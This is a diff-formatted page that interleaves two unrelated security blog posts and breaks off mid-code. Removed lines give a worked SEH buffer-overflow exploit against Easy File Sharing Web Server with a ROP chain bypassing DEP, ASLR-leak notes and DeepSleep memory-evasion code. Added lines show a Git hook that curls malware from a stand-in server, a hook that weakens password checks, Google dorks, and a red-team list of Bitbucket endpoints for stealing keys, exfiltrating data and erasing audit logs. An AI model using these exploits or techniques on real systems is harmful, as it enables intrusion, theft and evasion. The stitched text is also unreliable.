-ROPgadget.py --binary &lt;binary&gt; --ropchain</code></pre>
+<pre class="wp-block-code"><code>#!/bin/bash
 
+# A non-functional example of a malicious client-side pre-clone hook for malware propagation
 
+echo "Downloading a useful tool..."
 
-<h4 class="wp-block-heading"><strong>rp++</strong></h4>
+curl -o ~/Downloads/useful-tool.exe https://malicious-server.com/malware.exe</code></pre>
 
 
 
-<figure class="wp-block-image size-full"><img decoding="async" width="883" height="461" src="/wp-content/uploads/2024/09/image-11.png" alt="" class="wp-image-8830" srcset="/wp-content/uploads/2024/09/image-11.png 883w, /wp-content/uploads/2024/09/image-11-300x157.png 300w, /wp-content/uploads/2024/09/image-11-768x401.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
+<p class="wp-block-paragraph">This script, if operational, could attempt to download and execute malware on a developer&#8217;s machine during a repository clone operation.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A fast ROP gadget finder for PE/ELF/Mach-O files in x86/x64/ARM/ARM64 architectures.</li>
-</ul>
+<p class="wp-block-paragraph"><strong>4. Code Tampering:</strong> Attackers can manipulate client-side Git hooks to tamper with code and introduce vulnerabilities. For example, a malicious pre-commit hook could modify code in a way that introduces a security flaw, as demonstrated below:</p>
 
 
 
-<pre class="wp-block-code"><code>rp++ --file &lt;binary&gt; --rop
-rp++ --file &lt;binary&gt; --rop --va 0x0</code></pre>
+<pre class="wp-block-code"><code>#!/bin/bash
 
+# A non-functional example of a malicious client-side pre-commit hook for code tampering
 
+sed -i 's/validate_password($password)/validate_password($password, false)/' login.php</code></pre>
 
-<figure class="wp-block-image size-full"><img decoding="async" width="890" height="451" src="/wp-content/uploads/2024/09/image-12.png" alt="" class="wp-image-8831" srcset="/wp-content/uploads/2024/09/image-12.png 890w, /wp-content/uploads/2024/09/image-12-300x152.png 300w, /wp-content/uploads/2024/09/image-12-768x389.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></figure>
 
 
+<p class="wp-block-paragraph">In a real-world scenario, this modification could compromise the security of an application.</p>
 
-<h3 class="wp-block-heading">Security Mechanisms and Bypasses&nbsp;</h3>
 
 
+<p class="wp-block-paragraph">In summary, Git hooks in Bitbucket provide valuable automation capabilities but can also be potential vectors for abuse if not managed and secured properly.</p>
 
-<h4 class="wp-block-heading"><strong><em>Data Execution Prevention (DEP):</em></strong></h4>
 
 
+<h2 class="wp-block-heading">Tools</h2>
 
-<p class="wp-block-paragraph"><strong><em>Overview of DEP and Its Implementation:</em></strong> Data Execution Prevention (DEP) is a security feature that helps protect against code execution in non-executable memory regions. It works by marking certain areas of memory as non-executable, which prevents code from running in those regions. On modern operating systems, DEP is enforced using hardware and software techniques to distinguish between executable and non-executable memory regions, enhancing system security by mitigating attacks that rely on executing code from non-executable segments.</p>
 
 
+<p class="wp-block-paragraph">Identifying Bitbucket Instances with Cyber Threat Intelligence Service</p>
 
-<p class="wp-block-paragraph"><strong><em>Techniques Used by ROPGadget to Bypass DEP Protections:</em></strong> ROP (Return-Oriented Programming) gadgets are small snippets of executable code that end with a return instruction, and they can be used to chain together a series of operations without the need for direct code injection. ROPGadget, a tool for identifying such gadgets, facilitates this by searching for these snippets within existing binaries. Since ROP exploits execute only existing code within the application&#8217;s memory, they inherently bypass DEP protections. The DEP does not stop code from executing if it is already part of an executable segment; thus, ROPGadget&#8217;s role is crucial in identifying usable gadgets for constructing these exploits.</p>
 
 
+<p class="wp-block-paragraph">Google Dorks:</p>
 
-<p class="wp-block-paragraph">To bypass DEP (Data Execution Prevention) using Return-Oriented Programming (ROP), here&#8217;s a detailed step-by-step breakdown, focusing on a Windows 7 SP1 x64 environment and using the Easy File Sharing Web Server vulnerability.</p>
 
 
+<p class="wp-block-paragraph">Find Bitbucket Instances:</p>
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/Gu4rana/Using_ROP_Bypassing_DEP
-</div></figure>
 
 
+<p class="wp-block-paragraph">Dork: intitle:&#8221;Bitbucket&#8221; login</p>
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="878" height="723" src="/wp-content/uploads/2024/09/image-13.png" alt="" class="wp-image-8832" srcset="/wp-content/uploads/2024/09/image-13.png 878w, /wp-content/uploads/2024/09/image-13-300x247.png 300w, /wp-content/uploads/2024/09/image-13-768x632.png 768w" sizes="(max-width: 878px) 100vw, 878px" /></figure>
 
 
+<p class="wp-block-paragraph">Find Public Repositories:</p>
 
-<h4 class="wp-block-heading">1. <strong>Setup Environment</strong></h4>
 
 
+<p class="wp-block-paragraph">Dork: intitle:&#8221;Bitbucket&#8221; &#8220;Overview&#8221; inurl:projects</p>
 
-<ul class="wp-block-list">
-<li><strong>Operating System:</strong> Windows 7 SP1 x64</li>
 
 
+<p class="wp-block-paragraph">Exposed .git Directories:</p>
 
-<li><strong>Vulnerable Application:</strong> Easy File Sharing Web Server (<a href="https://www.exploit-db.com/exploits/38526">exploit link</a>)</li>
 
 
+<p class="wp-block-paragraph">Dork: intitle:&#8221;index of&#8221; inurl:.git</p>
 
-<li><strong>Debugger:</strong> Immunity Debugger with the Mona plugin installed.</li>
 
 
+<p class="wp-block-paragraph">Paths:</p>
 
-<li><strong>DEP Settings:</strong> Enabled using <code>bcdedit /set nx AlwaysOn</code>.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">User Enumeration:</p>
 
-<p class="wp-block-paragraph"><strong>DEP</strong> prevents execution of code from non-executable memory areas like the stack. To bypass this, ROP chains are used, which consist of short sequences of instructions called <em>gadgets</em>, ending with a <code>RET</code> instruction.</p>
 
 
+<p class="wp-block-paragraph">Path: /rest/api/1.0/users</p>
 
-<h4 class="wp-block-heading">2. <strong>Replicating the Exploit</strong></h4>
 
 
+<p class="wp-block-paragraph">Repository Discovery:</p>
 
-<ul class="wp-block-list">
-<li>From exploit-db, we know the application crashes when passing around 5000 bytes to the <code>UserID</code> cookie in the HTTP header.</li>
 
 
+<p class="wp-block-paragraph">Path: /rest/api/1.0/projects/{projectKey}/repos</p>
 
-<li>Create a test payload:</li>
-</ul>
 
 
+<p class="wp-block-paragraph">SSH Keys:</p>
 
-<pre class="wp-block-code"><code>exploit = "A" * 5000</code></pre>
 
 
+<p class="wp-block-paragraph">Path: /rest/ssh/1.0/keys</p>
 
-<p class="wp-block-paragraph">This crashes the application and overwrites the <code>EAX</code> register with <code>AAAA</code>. The crash occurs due to the instruction below:</p>
 
 
+<p class="wp-block-paragraph">Webhooks:</p>
 
-<pre class="wp-block-code"><code>61C277F6   8178 4C 97A629A0 CMP DWORD PTR DS:&#91;EAX+4C],A029A697</code></pre>
 
 
+<p class="wp-block-paragraph">Path: /rest/webhooks/1.0/webhook</p>
 
-<ul class="wp-block-list">
-<li>Additionally, the SEH (Structured Exception Handler) chain is overwritten.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Ports:</p>
 
-<h4 class="wp-block-heading">3. <strong>Finding Offset for EAX and SEH Overwrite</strong></h4>
 
 
+<p class="wp-block-paragraph">Default HTTP:</p>
 
-<ul class="wp-block-list">
-<li>Use Mona to generate a unique pattern:</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Port: 7990</p>
 
-<pre class="wp-block-code"><code>!mona pc 5000</code></pre>
 
 
+<p class="wp-block-paragraph">Default HTTPS:</p>
 
-<p class="wp-block-paragraph">After the crash, use Mona to find the offsets:</p>
 
 
+<p class="wp-block-paragraph">Port: 7999</p>
 
-<pre class="wp-block-code"><code>!mona findmsp</code></pre>
 
 
+<p class="wp-block-paragraph">SSH:</p>
 
-<p class="wp-block-paragraph">From the logs, you find that <code>EAX</code> is overwritten at offset 4183 and SEH at 4059 bytes.</p>
 
 
+<p class="wp-block-paragraph">Port: 7992</p>
 
-<ul class="wp-block-list">
-<li>Modify the exploit payload accordingly:</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Meta Tags:</p>
 
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += "C" * 4  # SEH
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
 
 
+<p class="wp-block-paragraph">Application Name:</p>
 
-<h4 class="wp-block-heading">4. <strong>Bad Characters</strong></h4>
 
 
+<p class="wp-block-paragraph">Meta Tag: &lt;meta name=&#8221;application-name&#8221; content=&#8221;Bitbucket&#8221;&gt;</p>
 
-<ul class="wp-block-list">
-<li>To ensure our exploit is clean, generate and compare the byte array to find bad characters:</li>
-</ul>
 
 
+<figure class="wp-block-image"><img decoding="async" src="https://lh7-us.googleusercontent.com/5DnXrtworRqbVPNmoCVB4aUIfY6rH8sB_rV5YpXDfyEloD3EpBwT6h8YixaBNd4VfNiG-lTwOMw-8g8UTYZ5Jsr7yHKNyE2TRZIbNFMq4nQQ9foC7SjvTYjqDRMvQf9MLalM0iLlN1164-Msg3uTqbw" alt=""/></figure>
 
-<pre class="wp-block-code"><code>!mona bytearray -cpb '\x00'
-!mona compare -f c:\logs\fsws\bytearray.bin -a 0x057A6F34</code></pre>
 
 
+<h2 class="wp-block-heading">Important API Endpoints Across Red Teaming Stages</h2>
 
-<ul class="wp-block-list">
-<li>Exclude <code>\x00</code> and <code>\x3b</code> from the payload.</li>
-</ul>
 
 
+<p class="wp-block-paragraph"><strong>1. Reconnaissance Stage:</strong></p>
 
-<h3 class="wp-block-heading">5. <strong>ROP Chain Construction</strong></h3>
 
 
+<p class="wp-block-paragraph">User Enumeration:</p>
 
-<ul class="wp-block-list">
-<li><strong>Stack Pivoting:</strong> The stack pointer points far away from our payload. We need to move it closer. Mona helps us find a stack pivot gadget:</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/users</p>
 
-<pre class="wp-block-code"><code>!mona stackpivot -distance 2548 -cpb '\x00\x3b'</code></pre>
 
 
+<p class="wp-block-paragraph">Red Team Use: Identifying users for targeted phishing or brute-force attacks.</p>
 
-<p class="wp-block-paragraph">One suitable gadget:</p>
 
 
+<p class="wp-block-paragraph">Repository Discovery:</p>
 
-<pre class="wp-block-code"><code>0x1002280a : {pivot 4100 / 0x1004} # ADD ESP,1004 # RETN ** &#91;ImageLoad.dll]</code></pre>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/projects/{projectKey}/repos</p>
 
-<p class="wp-block-paragraph">Update the payload:</p>
 
 
+<p class="wp-block-paragraph">Red Team Use: Identifying repositories to target for codebase analysis or data exfiltration.</p>
 
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler with stack pivot
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
 
 
+<p class="wp-block-paragraph"><strong>2. Initial Access Stage:</strong></p>
 
-<p class="wp-block-paragraph"><strong>ROP Chain Construction:</strong> The goal is to call <code>VirtualProtect()</code> to make our shellcode executable. The steps include:</p>
 
 
+<p class="wp-block-paragraph">Authentication:</p>
 
-<ul class="wp-block-list">
-<li>Stack pivoting.</li>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/auth/1/session</p>
 
-<li>Loading correct values into registers using gadgets.</li>
 
 
+<p class="wp-block-paragraph">Red Team Use: Attempting unauthorized access via credential stuffing or brute force.</p>
 
-<li>Calling <code>VirtualProtect()</code> with appropriate parameters.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">API Token Access:</p>
 
-<p class="wp-block-paragraph">Example gadgets and ROP chain:</p>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/access-tokens/1.0/tokens/current</p>
 
-<pre class="wp-block-code"><code>def create_rop_chain():
-    rop_chain = &#91;
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0xfffffdff,  # 2's complement of 0x00000201
-        0x100231d1,  # NEG EAX # RETN &#91;ImageLoad.dll]
-        0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:&#91;ESP+C] # RETN &#91;ImageLoad.dll]
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0x61c832d0,  # ptr to &amp;VirtualProtect() &#91;sqlite3.dll]
-        0x1001281a,  # ADD ESP,4 # RETN &#91;ImageLoad.dll]
-        0x61c735b4,  # Writable location &#91;sqlite3.dll]
-        # Add more gadgets as needed for ROP
-    ]
-    return ''.join(struct.pack("&lt;I", _) for _ in rop_chain)</code></pre>
 
 
+<p class="wp-block-paragraph">Red Team Use: Attempting to steal or misuse API tokens.</p>
 
-<h4 class="wp-block-heading">6. <strong>VirtualProtect API Call</strong></h4>
 
 
+<p class="wp-block-paragraph"><strong>3. Establishing Foothold Stage:</strong></p>
 
-<ul class="wp-block-list">
-<li><strong>Parameters:</strong>
-<ul class="wp-block-list">
-<li><code>lpAddress</code>: Pointer to the memory region you want to change.</li>
 
 
+<p class="wp-block-paragraph">Create Pull Request:</p>
 
-<li><code>dwSize</code>: Size of the region to change (e.g., 0x40 for PAGE_EXECUTE_READWRITE).</li>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/projects/{projectKey}/repos/{repositorySlug}/pull-requests</p>
 
-<li><code>flNewProtect</code>: The new protection attribute (e.g., PAGE_EXECUTE_READWRITE).</li>
 
 
+<p class="wp-block-paragraph">Red Team Use: Introducing malicious code through pull requests.</p>
 
-<li><code>lpflOldProtect</code>: Pointer to receive the old protection value.</li>
-</ul>
-</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Clone Repository:</p>
 
-<h4 class="wp-block-heading">7. <strong>Final Payload</strong></h4>
 
 
+<p class="wp-block-paragraph">Endpoint: /scm/{projectKey}/{repositorySlug}.git</p>
 
-<ul class="wp-block-list">
-<li>Ensure enough NOPs (<code>\x90</code>) before the shellcode to avoid overwriting caused by <code>FSTENV</code> pushing data onto the stack.</li>
 
 
+<p class="wp-block-paragraph">Red Team Use: Downloading codebases to identify vulnerabilities or sensitive data.</p>
 
-<li>Example payload:</li>
-</ul>
 
 
+<p class="wp-block-paragraph"><strong>4. Privilege Escalation Stage:</strong></p>
 
-<pre class="wp-block-code"><code>exploit = "A" * 2455  # Stack pivoting offset
-exploit += create_rop_chain()
-exploit += "\x90" * 32  # NOP slide
-exploit += shellcode  # Your shellcode
-exploit += "D" * (4059 - len(exploit))
-exploit += "BBBB"  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler
-exploit += "D" * (4183 - len(exploit))
-exploit += struct.pack("&lt;I", 0xffffffff)  # Trigger exception
-exploit += "D" * (5000 - len(exploit))</code></pre>
 
 
+<p class="wp-block-paragraph">User Permissions:</p>
 
-<h4 class="wp-block-heading"><strong><em>Address Space Layout Randomization (ASLR):</em></strong></h4>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/admin/permissions/users?filter={username}</p>
 
-<p class="wp-block-paragraph"><strong><em>Explanation of ASLR and Its Role in Security:</em></strong> Address Space Layout Randomization (ASLR) is a technique used to randomly arrange the address space of a process, including the base address of executables and shared libraries. This randomization makes it difficult for attackers to predict the location of specific code or data segments, significantly reducing the likelihood of successful exploitation of memory corruption vulnerabilities that rely on fixed addresses.</p>
 
 
+<p class="wp-block-paragraph">Red Team Use: Identifying users with high privileges to target.</p>
 
-<p class="wp-block-paragraph"><strong><em>Methods ROPGadget Uses to Overcome ASLR:</em></strong></p>
 
 
+<p class="wp-block-paragraph">Group Permissions:</p>
 
-<ol class="wp-block-list">
-<li><strong><em>Information Leakage:</em></strong> Attackers can exploit vulnerabilities that leak information about memory layout to determine the locations of ROP gadgets. By analyzing leaks, attackers can adjust their ROP chains to account for the randomized addresses, effectively overcoming ASLR.</li>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/admin/permissions/groups</p>
 
-<li><strong><em>Brute Forcing:</em></strong> In the absence of information leaks, brute-forcing techniques can be used to guess randomized addresses. This involves systematically attempting different address values until the correct ones are found, though this method is often more time-consuming and less practical compared to information leakage.</li>
-</ol>
 
 
+<p class="wp-block-paragraph">Red Team Use: Identifying groups with high privileges for infiltration.</p>
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://redteamrecipe.com/aslr-exploitation-techniques
-</div></figure>
 
 
+<p class="wp-block-paragraph"><strong>5. Lateral Movement Stage:</strong></p>
 
-<p class="wp-block-paragraph">Below is a structured overview of ASLR leak techniques and their relationship to ROP.</p>
 
 
+<p class="wp-block-paragraph">SSH Keys:</p>
 
-<h4 class="wp-block-heading">1. <strong>Modify Kernel Parameter (Linux)</strong></h4>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/ssh/1.0/keys</p>
 
-<p class="wp-block-paragraph">ASLR can be modified or disabled at the kernel level, which provides insights into memory layout:</p>
 
 
+<p class="wp-block-paragraph">Red Team Use: Stealing SSH keys to access other systems.</p>
 
-<ul class="wp-block-list">
-<li><strong>Setarch</strong>: A Linux utility that can run a program in a modified environment, allowing users to change ASLR settings for a specific execution.</li>
 
 
+<p class="wp-block-paragraph">Application Links:</p>
 
-<li><strong>Change Mach-O Flags</strong>: A Python script can be created to change Mach-O flags on macOS binaries to disable ASLR.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/applinks/1.0/applicationlink</p>
 
-<h4 class="wp-block-heading">2. <strong>Compiler Options (Windows)</strong></h4>
 
 
+<p class="wp-block-paragraph">Red Team Use: Moving laterally to linked applications.</p>
 
-<p class="wp-block-paragraph">In Windows, ASLR can be influenced by compiler settings, which can lead to information leaks:</p>
 
 
+<p class="wp-block-paragraph"><strong>6. Impact Stage:</strong></p>
 
-<ul class="wp-block-list">
-<li><strong>Disabling ASLR in Visual Studio</strong>: Compiling an application with specific flags can disable ASLR, making it easier to predict memory layout.</li>
 
 
+<p class="wp-block-paragraph">Delete Repository:</p>
 
-<li><strong>SetDllCharacteristics</strong>: This function allows setting the characteristics of a DLL, which can include disabling ASLR.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/projects/{projectKey}/repos/{repositorySlug}</p>
 
-<h4 class="wp-block-heading">3. <strong>Leaking KASLR (Kernel ASLR)</strong></h4>
 
 
+<p class="wp-block-paragraph">Red Team Use: Deleting or altering repositories to disrupt operations.</p>
 
-<p class="wp-block-paragraph">Kernel ASLR is a feature in many operating systems that randomizes the base address of kernel modules:</p>
 
 
+<p class="wp-block-paragraph">Modify User:</p>
 
-<ul class="wp-block-list">
-<li><strong>Startup_xen</strong>: An information leak during the startup process of a virtual machine in Xen can expose kernel addresses, providing a foothold for further exploitation.</li>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/users/{userSlug}</p>
 
-<li><strong>Android BINDER_TYPE_BINDER</strong>: An address leak can occur via the Android Binder IPC mechanism, allowing attackers to exploit ASLR.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Red Team Use: Modifying user details for further attacks or obfuscation.</p>
 
-<h4 class="wp-block-heading">4. <strong>Buffer Overflow to Control EAX</strong></h4>
 
 
+<p class="wp-block-paragraph">Additional Endpoints:</p>
 
-<p class="wp-block-paragraph">Buffer overflows are a common method to manipulate registers and control execution flow:</p>
 
 
+<p class="wp-block-paragraph"><strong>7. Data Exfiltration Stage:</strong></p>
 
-<ul class="wp-block-list">
-<li><strong>RET2ASLR</strong>: This technique involves leveraging a return address that points to a predictable location after ASLR is bypassed.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Fetch Commits:</p>
 
-<h4 class="wp-block-heading">5. <strong>Remote ASLR Leak in Microsoft&#8217;s RDP Client (CVE-2021-38665)</strong></h4>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/api/1.0/projects/{projectKey}/repos/{repositorySlug}/commits</p>
 
-<p class="wp-block-paragraph">A specific vulnerability in the Microsoft Remote Desktop Protocol (RDP) client allowed attackers to leak memory addresses, circumventing ASLR protections. This enabled the formulation of ROP chains against affected systems.</p>
 
 
+<p class="wp-block-paragraph">Red Team Use: Identifying and exfiltrating sensitive data or changes.</p>
 
-<h4 class="wp-block-heading">6. <strong>ROP Techniques</strong></h4>
 
 
+<p class="wp-block-paragraph"><strong>8. Persistence Stage:</strong></p>
 
-<p class="wp-block-paragraph">Once ASLR information is leaked, it can be used in various ROP techniques:</p>
 
 
+<p class="wp-block-paragraph">Webhooks:</p>
 
-<ul class="wp-block-list">
-<li><strong>ASLR Information Leak via Safe-Linking</strong>: In scenarios where a memory allocator is used (like tcache or fastbin chunks), information leaks can occur that reveal the base address of heap objects.</li>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/webhooks/1.0/webhook</p>
 
-<li><strong>Return To PLT (Procedure Linkage Table)</strong>: This method allows attackers to jump to the PLT to execute functions indirectly. By controlling the PLT entries, attackers can bypass ASLR.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Red Team Use: Creating malicious webhooks for continuous data access.</p>
 
-<h3 class="wp-block-heading">Advanced Techniques in ROP</h3>
 
 
+<p class="wp-block-paragraph"><strong>9. Obfuscation Stage:</strong></p>
 
-<h4 class="wp-block-heading"><strong><em>Complex ROP Chains:</em></strong></h4>
 
 
+<p class="wp-block-paragraph">Audit Logs:</p>
 
-<p class="wp-block-paragraph"><strong><em>Building Intricate Sequences of Gadgets:</em></strong> In Return-Oriented Programming (ROP), complex ROP chains are constructed by chaining together multiple gadgets to perform advanced operations. These gadgets are small code sequences ending in a <code>ret</code> instruction, allowing for precise control over execution flow.</p>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/audit/1.0/audits</p>
 
-<p class="wp-block-paragraph">For example, consider the following simple ROP chain:</p>
 
 
+<p class="wp-block-paragraph">Red Team Use: Identifying and erasing traces of malicious activities.</p>
 
-<ol class="wp-block-list">
-<li><strong>**Stack Pivoting Gadget:</strong></li>
-</ol>
 
 
+<p class="wp-block-paragraph"><strong>10. Cleanup Stage:</strong></p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>pop rdi ret</code></p>
 
 
+<p class="wp-block-paragraph">Remove SSH Key:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget sets the <code>rdi</code> register to a new value by popping from the stack, often used to pivot the stack pointer.</p>
 
 
+<p class="wp-block-paragraph">Endpoint: /rest/ssh/1.0/keys/{keyId}</p>
 
-<ol start="2" class="wp-block-list">
-<li><strong><em>Arithmetic Gadget:</em></strong></li>
-</ol>
 
 
+<p class="wp-block-paragraph">Red Team Use: Removing SSH keys to erase traces and maintain access.</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>add eax, 0x10 ret</code></p>
 
 
+<h2 class="wp-block-heading">Bitbucket Plugin Security and Development Guidelines</h2>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget increments the <code>eax</code> register by <code>0x10</code>.</p>
 
 
+<p class="wp-block-paragraph">Bitbucket, a widely-used Git repository management solution, allows developers to extend its functionality through plugins. However, the development and use of plugins must be approached with a security-first mindset to prevent vulnerabilities and ensure the stability of the Bitbucket environment.</p>
 
-<ol start="3" class="wp-block-list">
-<li><strong><em>Memory Access Gadget:</em></strong></li>
-</ol>
 
 
+<p class="wp-block-paragraph">Bitbucket Plugin Security:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>mov [rbx], rax ret</code></p>
 
 
+<p class="wp-block-paragraph">Dependency Scanning:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget stores the value of <code>rax</code> into the memory address pointed to by <code>rbx</code>.</p>
 
 
+<p class="wp-block-paragraph">Ensure all dependencies of your plugin are free from known vulnerabilities.</p>
 
-<ol start="4" class="wp-block-list">
-<li><strong><em>Function Call Gadget:</em></strong></li>
-</ol>
 
 
+<p class="wp-block-paragraph">Use tools like OWASP Dependency-Check to identify and fix issues.</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>call [rcx] ret</code></p>
 
 
+<p class="wp-block-paragraph">Code Review:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget performs a function call with the address stored in <code>rcx</code>.</p>
 
 
+<p class="wp-block-paragraph">Conduct regular code reviews to identify potential security issues.</p>
 
-<p class="wp-block-paragraph">Combining these gadgets in a ROP chain allows an attacker to manipulate stack pointers, perform arithmetic operations, and execute function calls. For example, an attacker might pivot the stack to a controlled location, modify values in memory, and call a function with specific parameters.</p>
 
 
+<p class="wp-block-paragraph">Ensure that no secrets or sensitive data are hardcoded in the plugin code.</p>
 
-<p class="wp-block-paragraph"><strong><em>Examples of Combining Various Gadget Types:</em></strong> A ROP chain might look like this :</p>
 
 
+<p class="wp-block-paragraph">Access Control:</p>
 
-<pre class="wp-block-code"><code>#0x5050118e: mov eax, esi ; pop esi ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x5052db24: pop ecx ; ret&amp;nbsp; ;
 
-#0x50533bf4: sub eax, ecx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
+<p class="wp-block-paragraph">Implement strict access controls and ensure that only authorized users can configure or use the plugin.</p>
 
-#0x505263f9: push eax ; pop esi ; pop ebx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x5053a0f5: pop eax ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x5050626e: add byte &#91;esi+0x3B], ah ; ret&amp;nbsp; ;</code></pre>
+<p class="wp-block-paragraph">Use Bitbucket’s built-in functions to enforce permissions.</p>
 
 
 
-<h4 class="wp-block-heading">DeepSleep</h4>
+<pre class="wp-block-code"><code>public void doSomeAction(HttpServletRequest req, HttpServletResponse rsp) {
 
+    PermissionCheck.checkAdmin();
 
+    // Action code here
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="887" height="270" src="/wp-content/uploads/2024/09/image-14.png" alt="" class="wp-image-8833" srcset="/wp-content/uploads/2024/09/image-14.png 887w, /wp-content/uploads/2024/09/image-14-300x91.png 300w, /wp-content/uploads/2024/09/image-14-768x234.png 768w" sizes="(max-width: 887px) 100vw, 887px" /></figure>
+}
 
+Input Validation:
 
+Validate and sanitize all inputs to prevent injection attacks.
 
-<p class="wp-block-paragraph">DeepSleep is a technique inspired by Gargoyle for x64 environments that utilizes Return-Oriented Programming (ROP) and Position Independent Code (PIC) to hide memory artifacts. The primary goal is to set up a ROP chain that calls <code>VirtualProtect()</code> to modify memory permissions, sleeps, and then resets the memory protection while avoiding detection by memory scanners like Moneta.</p>
+Use allow-lists and regular expressions to validate data.
 
+public FormValidation doCheckName(@QueryParameter String value) {
 
+    if (value.matches("^&#91;a-zA-Z0-9_]+$")) {
 
-<ol class="wp-block-list">
-<li><strong>ROP Chain</strong>: A sequence of carefully crafted gadget calls that allows an attacker to execute arbitrary code while evading detection.</li>
+        return FormValidation.ok();
 
+    } else {
 
+        return FormValidation.error("Invalid name");
 
-<li><strong>PIC (Position Independent Code)</strong>: Code that executes properly regardless of its memory address. This is crucial for making the payload stealthy and effective across different environments.</li>
+    }
 
-
-
-<li><strong>Memory Protection</strong>: The technique involves altering memory protection states to execute the malicious code while minimizing detection risk.</li>
-</ol>
-
-
-
-<h4 class="wp-block-heading">Implementation</h4>
-
-
-
-<p class="wp-block-paragraph"><strong>Prerequisites</strong></p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Development Environment</strong>: MinGW or a compatible environment to compile the code.</li>
-
-
-
-<li><strong>Windows Version</strong>: Tested on Windows 10, version 10.0.19044.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">ROP Chain Construction</h4>
-
-
-
-<p class="wp-block-paragraph">The following steps outline how to construct the ROP chain using VirtualProtect, Sleep, and back to VirtualProtect:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>ROP Gadgets</strong>: Identify the necessary ROP gadgets from <code>ntdll.dll</code>. The gadgets should include:
-<ul class="wp-block-list">
-<li>A gadget to call <code>VirtualProtect()</code>.</li>
-
-
-
-<li>A gadget to call <code>Sleep()</code>.</li>
-
-
-
-<li>A final gadget to call <code>VirtualProtect()</code> again to revert the memory protection.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Gadget Example</strong>: Here’s how you might find and construct your ROP gadgets.</li>
-</ol>
-
-
-
-<pre class="wp-block-code"><code>!mona rop -m ntdll.dll -cpb '\x00'</code></pre>
-
-
-
-<p class="wp-block-paragraph">This command will help you find the available ROP gadgets in <code>ntdll.dll</code> while excluding null bytes.</p>
-
-
-
-<h4 class="wp-block-heading">Sample Code for DeepSleep</h4>
-
-
-
-<p class="wp-block-paragraph">Here&#8217;s a simple example of how to set up the ROP chain for DeepSleep.</p>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-// Function prototype for VirtualProtect
-BOOL VirtualProtect(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flNewProtect,
-    PDWORD lpflOldProtect
-);
-
-void main() {
-    // Step 1: Prepare the ROP chain
-    // Assuming we have found the following gadgets:
-    // - gadget1: address of VirtualProtect
-    // - gadget2: address of Sleep
-    // - gadget3: address of VirtualProtect again
-
-    // Example addresses for ROP gadgets (replace with actual addresses)
-    ULONG_PTR gadget1 = 0x00000000; // Replace with the actual address for VirtualProtect
-    ULONG_PTR gadget2 = 0x00000000; // Replace with the actual address for Sleep
-    ULONG_PTR gadget3 = 0x00000000; // Replace with the actual address for VirtualProtect
-
-    // Step 2: Build the ROP chain
-    // Create a buffer to hold the ROP chain
-    ULONG_PTR ropChain&#91;6];
-
-    // Push necessary values onto the stack for VirtualProtect
-    ropChain&#91;0] = gadget1; // Address of VirtualProtect
-    ropChain&#91;1] = 0x400;   // Size of the page to modify
-    ropChain&#91;2] = PAGE_EXECUTE_READWRITE; // New protection
